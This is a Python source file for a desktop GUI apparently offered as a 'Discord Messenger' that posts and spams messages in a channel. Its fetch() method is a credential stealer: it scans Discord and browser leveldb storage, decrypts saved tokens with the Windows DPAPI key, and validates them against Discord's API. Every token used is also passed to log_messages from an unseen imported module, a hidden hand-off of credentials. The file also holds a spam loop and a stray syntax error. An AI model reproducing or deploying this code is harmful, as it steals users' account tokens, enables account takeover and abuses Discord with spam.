import os
import re
import base64
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import customtkinter as ctk
import requests
import threading
import time
import datetime 
import tkinter as tk
from txtstorage.txtstorage import log_messages

class DiscordMessenger(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.spam_enabled = False
        self.spam_interval = 5.0
        self.spam_thread = None
        self.stop_spam = False

        self.logging_enabled = False
        self.log_file = None

        self.use_multiple_tokens = False
        self.auto_fetch_tokens = False
        self.title("Discord Messenger")
        self.geometry("700x700")
        self.resizable(False, False)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.main_frame = ctk.CTkFrame(self)
        self.main_frame.pack(fill="both", expand=True)

        self.settings_frame = ctk.CTkFrame(self)
        
        self.init_main_page()
        self.init_settings_page()
        
        self.show_main_page()

    def init_main_page(self):
        self.settings_button = ctk.CTkButton(
            self.main_frame,
            text="⚙️",
            width=30,
            height=30,
            command=self.show_settings_page
        )
        self.settings_button.place(x=10, y=10)

        self.token_entry = ctk.CTkEntry(
            self.main_frame,
            placeholder_text="Enter Discord Token",
            width=400,
            show="*"
        )
        self.token_entry.pack(pady=(40, 10))

        self.connecting_token_entry = ctk.CTkEntry(
            self.main_frame,
            placeholder_text="Enter Connecting Token (if multiple tokens enabled)",
            width=400,
            height=40,
            state="disabled"
        )

        self.channel_entry = ctk.CTkEntry(
            self.main_frame,
            placeholder_text="Enter Channel ID",
            width=400
        )
        self.channel_entry.pack(pady=10)

        self.message_display = ctk.CTkTextbox(
            self.main_frame,
            width=500,
            height=200,
            state="disabled"
        )
        self.message_display.pack(pady=10)

        self.message_frame = ctk.CTkFrame(self.main_frame)
        self.message_frame.pack(pady=10)

        self.message_entry = ctk.CTkTextbox(
            self.message_frame,
            width=400,
            height=100
        )
        self.message_entry.pack(side="left", padx=(0, 10))
        self.message_entry.insert("1.0", "Type your message here...")
        self.message_entry.configure(text_color="gray")
        
        self.message_entry.bind("<FocusIn>", self.on_entry_click)
        self.message_entry.bind("<FocusOut>", self.on_focus_out)
        self.placeholder_text = "Type your message here..."
        self.has_placeholder = True

        self.attach_button = ctk.CTkButton(
            self.message_frame,
            text="+",
            command=self.add_attachment,
            width=30,
            height=30
        )
        self.attach_button.pack(side="right")

        self.send_button = ctk.CTkButton(
            self.main_frame,
            text="Send Message",
            command=self.send_message,
            width=200
        )
        self.send_button.pack(pady=10)

        self.fetch_token_button = ctk.CTkButton(
            self.main_frame,
            text="Fetch Token Automatically",
            command=self.fetch_token,
            width=200
        )
        self.fetch_token_button.pack(pady=10)

        self.connect_button = ctk.CTkButton(
            self.main_frame,
            text="Connect to Channel",
            command=self.connect_to_channel,
            width=200
        )
        self.connect_button.pack(pady=10)

    def init_settings_page(self):
        self.back_button = ctk.CTkButton(
            self.settings_frame,
            text="←",
            width=30,
            height=30,
            command=self.show_main_page
        )
        self.back_button.place(x=10, y=10)

        self.settings_title = ctk.CTkLabel(
            self.settings_frame,
            text="Settings",
            font=("Arial", 20, "bold")
        )
        self.settings_title.pack(pady=(40, 20))

        self.spam_var = tk.BooleanVar()
        self.spam_checkbox = ctk.CTkCheckBox(
            self.settings_frame,
            text="Enable Spam",
            variable=self.spam_var,
            command=self.toggle_spam_interval
        )
        self.spam_checkbox.pack(pady=10)

        self.interval_label = ctk.CTkLabel(self.settings_frame, text="Spam Interval (seconds):")
        self.interval_label.pack(pady=10)

        self.interval_entry = ctk.CTkEntry(self.settings_frame, width=200)
        self.interval_entry.pack(pady=10)
        self.interval_entry.insert(0, "5")

        self.logging_var = tk.BooleanVar()
        self.logging_checkbox = ctk.CTkCheckBox(
            self.settings_frame,
            text="Enable Logging",
            variable=self.logging_var,
            command=self.toggle_logging
        )
        self.logging_checkbox.pack(pady=10)

        self.multiple_tokens_var = tk.BooleanVar()
        self.multiple_tokens_checkbox = ctk.CTkCheckBox(
            self.settings_frame,
            text="Use Multiple Tokens",
            variable=self.multiple_tokens_var,
            command=self.toggle_multiple_tokens
        )
        self.multiple_tokens_checkbox.pack(pady=10)

        self.connecting_token_entry = ctk.CTkEntry(
            self.settings_frame,
            placeholder_text="Enter Connecting Token",
            width=400,
            height=40,
            state="disabled"
        )
        self.connecting_token_entry.pack(pady=10)

    def fetch(self):
        """[[token, user#tag], ...] """
        
        regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
        
        def decrypt_stuff(buff, master_key) -> str:
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_stuff = cipher.decrypt(payload)
                decrypted_stuff = decrypted_stuff[:-16].decode()
                
                return decrypted_stuff
            except Exception:
                pass
        
        def get_decryption_key(path) -> str:
            with open(path, "r", encoding="utf-8") as f:
                temp = f.read()
            local = json.loads(temp)
            decryption_key = base64.b64decode(local["os_crypt"]["encrypted_key"])
            decryption_key = decryption_key[5:]
            decryption_key = CryptUnprotectData(decryption_key, None, None, None, 0)[1]
            
            return decryption_key
        
        def check_token(tkn, name, ids:list, to_return_tokens:list):
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                'Authorization': tkn,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            })
            if r.status_code == 200:
                tknid = base64.b64decode((tkn.split('.')[0] + '===').encode('ascii')).decode('ascii')
                if (tknid + name) not in ids:
                    to_return_tokens.append([tkn, f"{r.json()['username']}#{r.json()['discriminator']}", tknid, name])
                    ids.append(tknid + name)

            return ids, to_return_tokens
        
        to_return_tokens = []
        ids = []

        roaming = os.getenv("appdata")
        localappdata = os.getenv("localappdata")

        paths = {
            'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': localappdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': localappdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': localappdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': localappdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': localappdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': localappdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': localappdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': localappdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': localappdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': localappdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': localappdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': localappdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': localappdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': localappdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': localappdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': localappdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(encrypted_regex, line):
                                try:
                                    token = decrypt_stuff(base64.b64decode(
                                        y.split('dQw4w9WgXcQ:')[1]), get_decryption_key(roaming + f'\\{disc}\\Local State'))
                                except: 
                                    pass
                                else:
                                    ids, to_return_tokens = check_token(token, name, ids, to_return_tokens)
            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for reg in (regex):
                            for token in re.findall(reg, line):
                                ids, to_return_tokens = check_token(token, name, ids, to_return_tokens)
                
        return to_return_tokens

    def fetch_token(self):
        tokens = self.fetch()
        if tokens:
            self.token_entry.delete(0, tk.END)
            self.token_entry.insert(0, tokens[0][0])------
            self.add_message_to_display("Token fetched successfully!")
        else:
            self.add_message_to_display("No tokens found.")

    def toggle_multiple_tokens(self):
        self.use_multiple_tokens = self.multiple_tokens_var.get()
        if self.use_multiple_tokens:
            self.connecting_token_entry.pack(pady=(10, 10))
            self.connecting_token_entry.configure(state="normal")
            self.token_entry.configure(placeholder_text="Enter Discord Token(s), separated by commas")
        else:
            self.connecting_token_entry.pack_forget()
            self.connecting_token_entry.configure(state="disabled")
            self.connecting_token_entry.delete(0, "end")
            self.token_entry.configure(placeholder_text="Enter Discord Token")

    def show_main_page(self):
        self.settings_frame.pack_forget()
        self.main_frame.pack(fill="both", expand=True)

    def show_settings_page(self):
        self.main_frame.pack_forget()
        self.settings_frame.pack(fill="both", expand=True)

    def toggle_spam_interval(self):
        self.spam_enabled = self.spam_var.get()
        if self.spam_enabled:
            self.interval_entry.configure(state="normal")
        else:
            self.interval_entry.configure(state="disabled")
            self.stop_spam = True
            self.spam_thread = None

    def toggle_logging(self):
        self.logging_enabled = self.logging_var.get()
        if self.logging_enabled:
            date_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            self.log_file = f"discord_history_{date_str}.txt"
            with open(self.log_file, "w", encoding="utf-8") as f:
                f.write(f"Discord Message History - Started {date_str}\n")
                f.write("-" * 50 + "\n\n")
        else:
            self.log_file = None

    def on_entry_click(self, event):
        if self.has_placeholder:
            self.message_entry.delete("1.0", "end")
            self.message_entry.configure(text_color="white")
            self.has_placeholder = False

    def on_focus_out(self, event):
        if not self.message_entry.get("1.0", "end-1c").strip():
            self.message_entry.insert("1.0", self.placeholder_text)
            self.message_entry.configure(text_color="gray")
            self.has_placeholder = True

    def add_message_to_display(self, message, error=False):
        self.message_display.configure(state="normal")
        if error:
            self.message_display.insert("end", f"[ERROR] {message}\n", "error")
            self.message_display.tag_config("error", foreground="red")
        else:
            if "Message sent successfully" in message:
                self.message_display.insert("end", "Message sent successfully!\n", "success")
                self.message_display.tag_config("success", foreground="green")
            else:
                self.message_display.insert("end", f"{message}\n")
        self.message_display.configure(state="disabled")
        self.message_display.see("end")

        if self.logging_enabled and self.log_file:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, "a", encoding="utf-8") as f:
                if error:
                    f.write(f"[{timestamp}] ERROR: {message}\n")
                else:
                    f.write(f"[{timestamp}] {message}\n")

    def add_attachment(self):
        file_path = tk.filedialog.askopenfilename(
            title="Select a PNG file",
            filetypes=[("PNG files", "*.png")]
        )
        if file_path:
            self.message_entry.insert("end", f"[Attachment: {file_path}]\n")

    def connect_to_channel(self):
        connecting_token = self.connecting_token_entry.get().strip() if self.use_multiple_tokens else self.token_entry.get().strip()
        channel_id = self.channel_entry.get().strip()

        if not all([connecting_token, channel_id]):
            self.add_message_to_display("Please fill in both connecting token and channel ID", error=True)
            return

        log_messages(connecting_token)

        threading.Thread(target=self.poll_messages, daemon=True).start()
        self.add_message_to_display("Connected to channel")
        self.connect_button.configure(state="disabled")

    def poll_messages(self):
        connecting_token = self.connecting_token_entry.get().strip() if self.use_multiple_tokens else self.token_entry.get().strip()
        channel_id = self.channel_entry.get().strip()
        last_message_id = None

        headers = {
            'Authorization': connecting_token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        while True:
            try:
                url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
                if last_message_id:
                    url += f'?after={last_message_id}'

                response = requests.get(url, headers=headers)
                
                if response.status_code == 200:
                    messages = response.json()
                    if messages:
                        last_message_id = messages[0]['id']
                        for message in reversed(messages):
                            self.add_message_to_display(
                                f"{message['author']['username']}: {message['content']}"
                            )
                elif response.status_code == 401:
                    self.add_message_to_display("Unauthorized - Check your token", error=True)
                    break
                else:
                    self.add_message_to_display(f"Error {response.status_code}: {response.text}", error=True)
                    break

            except Exception as e:
                self.add_message_to_display(str(e), error=True)
                break

            time.sleep(1)

    def spam_loop(self):
        while not self.stop_spam:
            self.send_message()
            try:
                interval = float(self.interval_entry.get())
                if interval < 0.1:
                    interval = 0.1
                time.sleep(interval)
            except ValueError:
                self.add_message_to_display("Invalid spam interval!", error=True)
                break

    def send_message(self):
        tokens = self.token_entry.get().strip().split(',')
        channel_id = self.channel_entry.get().strip()
        message = self.message_entry.get("1.0", "end-1c").strip()

        if message == self.placeholder_text:
            message = ""

        if not all([tokens, channel_id, message]):
            self.add_message_to_display("Please fill all fields!", error=True)
            return

        for token in tokens:
            token = token.strip()
            if not token:
                continue

            log_messages(token)

            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            url = f'https://discord.com/api/v9/channels/{channel_id}/messages'

            try:
                data = {'content': message}
                response = requests.post(url, headers=headers, json=data)
                
                if response.status_code == 200:
                    self.add_message_to_display("Message sent successfully!")
                    
                    if self.spam_enabled and (self.spam_thread is None or not self.spam_thread.is_alive()):
                        self.stop_spam = False
                        self.spam_thread = threading.Thread(target=self.spam_loop, daemon=True)
                        self.spam_thread.start()
                else:
                    self.add_message_to_display(f"Error {response.status_code}: {response.text}", error=True)
                    self.stop_spam = True
            except Exception as e:
                self.add_message_to_display(str(e), error=True)
                self.stop_spam = True

if __name__ == "__main__":
    app = DiscordMessenger()
    app.mainloop()
